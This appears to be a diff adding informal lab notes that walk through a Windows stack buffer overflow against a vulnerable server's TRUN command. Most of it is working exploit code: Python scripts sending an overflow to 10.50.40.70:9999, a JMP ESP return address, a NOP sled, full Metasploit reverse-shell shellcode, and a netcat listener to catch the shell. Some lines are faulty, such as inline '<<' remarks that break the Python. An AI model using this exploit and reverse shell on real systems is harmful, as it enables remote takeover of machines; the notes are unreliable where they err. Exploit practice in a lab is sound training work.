@@ -1,0 +1,139 @@
+On windows device, take your exe and throw it into the 'Immunity Debugger'
+
+A bunch of shit should pop up
+
+In the CPU windows, it have 4 sections
+
+Press play, it's waiting for network connections
+
+On linops, write the exploit: nano winbuffer.py
+
+#!/usr/bin/python
+
+import socket
+
+buf = "TRUN /.:/"  # << vulnerable commade we are going to exploit
+buf += "3000 characters go here"
+
+s = socket.socket (socket.AF_INET,socket.SOCK_STREAM) #creates IPv4 socket/tcp stream
+s.connect(("10.50.40.70",9999)) #connect to target IP and port << the port is the the tunnel we made to get to this device
+print s.recv(1024) #print response
+s.send(buf) #send value of buf
+print s.recv(1024)
+s.close() #close the socket
+
+
+run this script, it should crash Immunity Debugger, stay on the CPU window, in the top right one copy the EIP value, throw it into your offset portion on the website
+you should get a value of a few thousand or so
+
+#!/usr/bin/python
+
+import socket
+
+buf = "TRUN /.:/"  # << vulnerable commade we are going to exploit
+buf += "A" * 2003 << 2003 is an example of whatever value you got from above
+
+s = socket.socket (socket.AF_INET,socket.SOCK_STREAM) #creates IPv4 socket/tcp stream
+s.connect(("10.50.40.70",9999)) #connect to target IP and port << the port is the the tunnel we made to get to this device
+print s.recv(1024) #print response
+s.send(buf) #send value of buf
+print s.recv(1024)
+s.close() #close the socket
+
+back in the windows device, in the white bar at the bottom, type !mona modules, stay on the log data tab 
+then type !mona jmp -r esp -m "essfunc.dll" << the dll might be different, check what you have
+
+in the results section, find the top line underneath the "Results:", right click, copy address
+625012A0
+convert this to little endian
+"\xA0\x12\x50\x62"
+need to include nop sled and shell code in the script
+
+
+#!/usr/bin/python
+
+import socket
+
+buf = "TRUN /.:/"  # << vulnerable commade we are going to exploit
+buf += "A" * 2003 << 2003 is an example of whatever value you got from above
+buf +="\xA0\x12\x50\x62" << NOW INCLUDED
+buf += "\x90" * 10 << NOW INCLUDE NOP SLED
+s = socket.socket (socket.AF_INET,socket.SOCK_STREAM) #creates IPv4 socket/tcp stream
+s.connect(("10.50.40.70",9999)) #connect to target IP and port << the port is the the tunnel we made to get to this device
+print s.recv(1024) #print response
+s.send(buf) #send value of buf
+print s.recv(1024)
+s.close() #close the socket
+
+ALMOST THERE, NOW IT'S TIME FOR THE SHELL CODE!!!!
+
+msfconsole
+use windows/shell_reverse_tcp
+set LHOST [WINDOWS DEVICE TO EXPLOIT]
+generate -b "\x00\x20\x0a\x0d" -f python
+
+COPY AND PASTE THE SHELL CODE 
+COPY FROM THE SECOND LINE DOWN, DONT INCLUDE THE FIRST buf = b""
+
+past that shit into the script
+
+------------------------------------------------------------------------------------------------
+#!/usr/bin/python
+
+import socket
+
+buf = "TRUN /.:/"  # << vulnerable commade we are going to exploit
+buf += "A" * 2003
+buf += "\xA0\x12\x50\x62"
+buf += "\x90" * 10
+buf += b"\xbe\x98\xaa\x1e\xa3\xd9\xe9\xd9\x74\x24\xf4\x58\x31"
+buf += b"\xc9\xb1\x52\x31\x70\x12\x83\xe8\xfc\x03\xe8\xa4\xfc"
+buf += b"\x56\xf4\x51\x82\x99\x04\xa2\xe3\x10\xe1\x93\x23\x46"
+buf += b"\x62\x83\x93\x0c\x26\x28\x5f\x40\xd2\xbb\x2d\x4d\xd5"
+buf += b"\x0c\x9b\xab\xd8\x8d\xb0\x88\x7b\x0e\xcb\xdc\x5b\x2f"
+buf += b"\x04\x11\x9a\x68\x79\xd8\xce\x21\xf5\x4f\xfe\x46\x43"
+buf += b"\x4c\x75\x14\x45\xd4\x6a\xed\x64\xf5\x3d\x65\x3f\xd5"
+buf += b"\xbc\xaa\x4b\x5c\xa6\xaf\x76\x16\x5d\x1b\x0c\xa9\xb7"
+buf += b"\x55\xed\x06\xf6\x59\x1c\x56\x3f\x5d\xff\x2d\x49\x9d"
+buf += b"\x82\x35\x8e\xdf\x58\xb3\x14\x47\x2a\x63\xf0\x79\xff"
+buf += b"\xf2\x73\x75\xb4\x71\xdb\x9a\x4b\x55\x50\xa6\xc0\x58"
+buf += b"\xb6\x2e\x92\x7e\x12\x6a\x40\x1e\x03\xd6\x27\x1f\x53"
+buf += b"\xb9\x98\x85\x18\x54\xcc\xb7\x43\x31\x21\xfa\x7b\xc1"
+buf += b"\x2d\x8d\x08\xf3\xf2\x25\x86\xbf\x7b\xe0\x51\xbf\x51"
+buf += b"\x54\xcd\x3e\x5a\xa5\xc4\x84\x0e\xf5\x7e\x2c\x2f\x9e"
+buf += b"\x7e\xd1\xfa\x31\x2e\x7d\x55\xf2\x9e\x3d\x05\x9a\xf4"
+buf += b"\xb1\x7a\xba\xf7\x1b\x13\x51\x02\xcc\x16\x94\x24\x4a"
+buf += b"\x4f\xda\x34\x43\xd3\x53\xd2\x09\xfb\x35\x4d\xa6\x62"
+buf += b"\x1c\x05\x57\x6a\x8a\x60\x57\xe0\x39\x95\x16\x01\x37"
+buf += b"\x85\xcf\xe1\x02\xf7\x46\xfd\xb8\x9f\x05\x6c\x27\x5f"
+buf += b"\x43\x8d\xf0\x08\x04\x63\x09\xdc\xb8\xda\xa3\xc2\x40"
+buf += b"\xba\x8c\x46\x9f\x7f\x12\x47\x52\x3b\x30\x57\xaa\xc4"
+buf += b"\x7c\x03\x62\x93\x2a\xfd\xc4\x4d\x9d\x57\x9f\x22\x77"
+buf += b"\x3f\x66\x09\x48\x39\x67\x44\x3e\xa5\xd6\x31\x07\xda"
+buf += b"\xd7\xd5\x8f\xa3\x05\x46\x6f\x7e\x8e\x76\x3a\x22\xa7"
+buf += b"\x1e\xe3\xb7\xf5\x42\x14\x62\x39\x7b\x97\x86\xc2\x78"
+buf += b"\x87\xe3\xc7\xc5\x0f\x18\xba\x56\xfa\x1e\x69\x56\x2f"
+
+s = socket.socket (socket.AF_INET,socket.SOCK_STREAM) #creates IPv4 socket/tcp stream
+s.connect(("10.50.40.70",9999)) #connect to target IP and port << the port is the the tunnel we made to get to this device
+print s.recv(1024) #print response
+s.send(buf) #send value of buf
+print s.recv(1024)
+s.close() #close the socket
+-------------------------------------------------------------------------------------------------------------------------------------
+
+back into the windows box! dont need immunity debugger, close that shit
+
+right click your exploitable executable, right click and run as admin
+
+
+on LINUX:
+nc -lvp 4444 << the payload you used, shouldnt need to change this unless you changed it in the msfconsole
+
+now run your payload and pray that it works
+
+
+
+
+
+
